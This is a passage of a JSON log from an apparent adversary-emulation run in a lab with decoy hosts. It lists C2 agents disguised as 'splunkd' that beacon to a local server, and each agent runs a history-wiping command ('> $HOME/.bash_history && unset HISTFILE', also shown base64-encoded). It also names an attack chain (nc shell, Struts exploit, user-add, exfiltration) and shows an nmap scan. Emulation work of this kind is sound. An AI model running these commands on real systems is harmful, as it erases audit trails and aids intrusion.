"buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:33:44Z"}], "pending_contact": "HTTP"}, {"paw": "czljvk", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 1449, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.4"], "display_name": "webserver-b$tomcat", "created": "2024-04-26T23:40:37Z", "last_seen": "2024-04-26T23:51:56Z", "links": [{"id": "5bc81929-5fdf-4f4c-9f20-32a76d575092", "paw": "czljvk", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:40:37Z", "pin": 0, "pid": "1453", "facts": [], "relationships": [], "used": [], "unique": "5bc81929-5fdf-4f4c-9f20-32a76d575092", "collect": "2024-04-26T23:40:37Z", "finish": "2024-04-26T23:40:37Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:40:37Z"}], "pending_contact": "HTTP"}, {"paw": "cxfxwj", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 2008, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.3"], "display_name": "webserver-a$tomcat", "created": "2024-04-26T23:42:17Z", "last_seen": "2024-04-26T23:51:56Z", "links": [{"id": "81e746e8-792a-46a2-96c9-117e0ca93d50", "paw": "cxfxwj", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:42:17Z", "pin": 0, "pid": "2012", "facts": [], "relationships": [], "used": [], "unique": "81e746e8-792a-46a2-96c9-117e0ca93d50", "collect": "2024-04-26T23:42:17Z", "finish": "2024-04-26T23:42:17Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:42:17Z"}], "pending_contact": "HTTP"}, {"paw": "dagwxr", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 1467, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "webserver-c", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.200.5"], "display_name": "webserver-c$tomcat", "created": "2024-04-26T23:43:40Z", "last_seen": "2024-04-26T23:51:58Z", "links": [{"id": "0c9c63b4-bb5e-421c-86ea-54682d051d79", "paw": "dagwxr", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:43:40Z", "pin": 0, "pid": "1471", "facts": [], "relationships": [], "used": [], "unique": "0c9c63b4-bb5e-421c-86ea-54682d051d79", "collect": "2024-04-26T23:43:40Z", "finish": "2024-04-26T23:43:40Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:43:40Z"}], "pending_contact": "HTTP"}, {"paw": "gbimmx", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 5640, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "decoy-1", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.82"], "display_name": "decoy-1$tomcat", "created": "2024-04-26T23:44:49Z", "last_seen": "2024-04-26T23:51:59Z", "links": [{"id": "8848cb48-e286-4b95-b24b-cee83fa68718", "paw": "gbimmx", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:44:49Z", "pin": 0, "pid": "5644", "facts": [], "relationships": [], "used": [], "unique": "8848cb48-e286-4b95-b24b-cee83fa68718", "collect": "2024-04-26T23:44:49Z", "finish": "2024-04-26T23:44:49Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-1", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:44:49Z"}], "pending_contact": "HTTP"}, {"paw": "jyirhn", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "tomcat", "location": "/home/tomcat/splunkd", "pid": 5694, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "splunkd", "host": "decoy-0", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.90"], "display_name": "decoy-0$tomcat", "created": "2024-04-26T23:45:35Z", "last_seen": "2024-04-26T23:51:58Z", "links": [{"id": "eac1449c-e13f-4113-8b11-7b55eee1e8b1", "paw": "jyirhn", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:45:35Z", "pin": 0, "pid": "5698", "facts": [], "relationships": [], "used": [], "unique": "eac1449c-e13f-4113-8b11-7b55eee1e8b1", "collect": "2024-04-26T23:45:35Z", "finish": "2024-04-26T23:45:35Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "decoy-0", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:45:35Z"}], "pending_contact": "HTTP"}, {"paw": "etrrtg", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "databaseB", "location": "/home/databaseB/sandcat.go", "pid": 1109, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "database-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.6"], "display_name": "database-b$databaseB", "created": "2024-04-26T23:46:20Z", "last_seen": "2024-04-26T23:51:59Z", "links": [{"id": "b1d8ba10-4f7b-4f81-b23d-7ac7e5af6fab", "paw": "etrrtg", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:46:20Z", "pin": 0, "pid": "1113", "facts": [], "relationships": [], "used": [], "unique": "b1d8ba10-4f7b-4f81-b23d-7ac7e5af6fab", "collect": "2024-04-26T23:46:20Z", "finish": "2024-04-26T23:46:20Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:46:20Z"}], "pending_contact": "HTTP"}, {"paw": "tkawqx", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "employeeB", "location": "/home/employeeB/sandcat.go", "pid": 1548, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "employee-b", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.4"], "display_name": "employee-b$employeeB", "created": "2024-04-26T23:48:00Z", "last_seen": "2024-04-26T23:51:54Z", "links": [{"id": "ef277cd9-b5a5-42f6-8b3c-421d5d7638ee", "paw": "tkawqx", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:48:00Z", "pin": 0, "pid": "1552", "facts": [], "relationships": [], "used": [], "unique": "ef277cd9-b5a5-42f6-8b3c-421d5d7638ee", "collect": "2024-04-26T23:48:00Z", "finish": "2024-04-26T23:48:00Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:48:00Z"}], "pending_contact": "HTTP"}, {"paw": "qysmha", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "databaseA", "location": "/home/databaseA/sandcat.go", "pid": 1544, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "database-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.5"], "display_name": "database-a$databaseA", "created": "2024-04-26T23:48:10Z", "last_seen": "2024-04-26T23:51:59Z", "links": [{"id": "181964cd-1070-42d7-a62b-ac6dc8a535f4", "paw": "qysmha", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:48:10Z", "pin": 0, "pid": "1548", "facts": [], "relationships": [], "used": [], "unique": "181964cd-1070-42d7-a62b-ac6dc8a535f4", "collect": "2024-04-26T23:48:10Z", "finish": "2024-04-26T23:48:10Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:48:10Z"}], "pending_contact": "HTTP"}, {"paw": "cfisqp", "sleep_min": 1, "sleep_max": 6, "watchdog": 0, "group": "red", "architecture": "amd64", "platform": "linux", "server": "http://10.20.20.1:8888", "upstream_dest": "http://10.20.20.1:8888", "username": "employeeA", "location": "/home/employeeA/sandcat.go", "pid": 1648, "ppid": 1, "trusted": true, "executors": ["proc", "sh"], "privilege": "User", "exe_name": "sandcat.go", "host": "employee-a", "contact": "HTTP", "proxy_receivers": {}, "proxy_chain": [], "origin_link_id": "", "deadman_enabled": true, "available_contacts": ["HTTP"], "host_ip_addrs": ["192.168.201.3"], "display_name": "employee-a$employeeA", "created": "2024-04-26T23:49:21Z", "last_seen": "2024-04-26T23:51:58Z", "links": [{"id": "4aca550a-2b05-42c9-a04d-36fafc861699", "paw": "cfisqp", "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "status": 0, "score": 0, "jitter": 0, "decide": "2024-04-26T23:49:21Z", "pin": 0, "pid": "1652", "facts": [], "relationships": [], "used": [], "unique": "4aca550a-2b05-42c9-a04d-36fafc861699", "collect": "2024-04-26T23:49:21Z", "finish": "2024-04-26T23:49:21Z", "ability": {"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "tactic": "defense-evasion", "technique_name": "Indicator Removal on Host: Clear Command History", "technique_id": "T1070.003", "name": "Avoid logs", "description": "Stop terminal from logging history", "executors": [{"name": "sh", "platform": "darwin", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, {"name": "psh", "platform": "windows", "command": "Clear-History;Clear", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": false, "buckets": ["defense-evasion"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "stockpile", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "> $HOME/.bash_history && unset HISTFILE", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "False", "deadman": false, "agent_reported_time": "2024-04-26T23:49:21Z"}], "pending_contact": "HTTP"}], "adversary": {"adversary_id": "deception_enterprise", "name": "Deception Enterprise", "description": "This is simple", "atomic_ordering": ["deception-nmap", "deception-nmapsubnet", "deception-ssh", "deception-ssh-copy", "deception-user-add", "deception-user-run-agent", "deception-ncshell", "deception-vsftpd", "deception-whoami", "deception-ls", "deception-ls-home", "deception-pwd", "deception-readfile", "deception-struts", "deception-parse-sshconfig", "deception-scp-copy", "deception-wget-copy", "deception-exfil-results"], "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "tags": [], "has_repeatable_abilities": false, "plugin": "deception"}, "jitter": "2/8", "planner": {"id": "random_planner", "name": "Random Planner", "module": "plugins.deception.app.random", "params": {}, "description": "Runs random strategy", "stopping_conditions": [], "ignore_enforcement_modules": [], "allow_repeatable_abilities": true, "plugin": "deception"}, "start": "2024-04-26T23:39:20Z", "state": "finished", "obfuscator": "plain-text", "autonomous": 1, "chain": [{"id": "527e0f53-965b-492f-b99c-ef0b203dd210", "paw": "rezmky", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:39:20Z", "pin": 0, "pid": "1757", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.202.1', '192.168.202.2', '192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.1", "192.168.202.2", "192.168.202.3"], "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49bf1f0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49be4d0>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.202.1', '192.168.202.2', '192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.1", "192.168.202.2", "192.168.202.3"], "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": 